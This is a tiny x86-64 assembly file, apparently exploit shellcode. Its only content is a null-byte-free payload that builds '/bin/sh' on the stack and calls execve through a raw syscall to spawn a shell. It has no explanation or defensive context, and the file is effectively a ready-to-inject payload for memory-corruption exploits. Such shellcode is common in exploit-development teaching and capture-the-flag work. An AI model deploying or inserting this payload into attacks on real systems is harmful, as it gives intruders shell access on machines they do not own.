; vim: sw=8 sts=8 et

bits    64
        xor     rax, rax
        mov     rdx, 0x68732F6E69622FFF
        push    rax
        push    rdx
        lea     rdi, [rsp+1]
        push    rax
        pop     rsi
        mov     al, 59
        cqo
        syscall
